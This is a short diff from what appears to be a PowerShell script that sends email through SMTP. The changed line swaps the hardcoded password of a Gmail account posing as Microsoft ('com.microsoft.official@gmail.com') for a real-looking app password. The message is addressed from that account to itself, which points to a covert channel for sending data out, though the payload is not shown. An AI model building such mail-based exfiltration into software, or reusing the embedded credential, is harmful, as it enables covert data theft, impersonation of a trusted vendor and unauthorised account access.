@@ -76,7 +76,7 @@ else{
     $smtp = New-Object Net.Mail.SmtpClient($smtpServer )
     $smtp.Timeout = 400000
     $smtp.EnableSsl = $True
-    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "com@microsoft"); 
+    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "nycmyjopmshxoohe"); 
     $msg.From = "com.microsoft.official@gmail.com"
     $msg.To.Add("com.microsoft.official@gmail.com")
 
